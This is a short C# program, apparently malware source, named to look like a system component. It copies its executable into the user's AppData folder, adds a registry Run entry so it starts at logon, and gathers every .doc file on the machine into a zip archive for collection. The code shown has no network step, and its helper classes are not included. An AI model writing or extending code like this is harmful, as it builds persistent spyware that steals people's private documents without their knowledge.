using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace systemU
{
    class Program
    {
        static void Main(string[] args)
        {
            String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                rk.SetValue( Process.GetCurrentProcess().ProcessName, "\"" + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", fileName) + "\"" );
            
            
            if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", fileName)))
            {
                String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\"));
                File.Copy(filePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\" , fileName));
            }
            //make zip file at c:\WindowsBt    
            new ZipMaker().makeZip(new FileGeter().forourWORK("*.doc*"));
            Console.Read();
        }       
    }
}
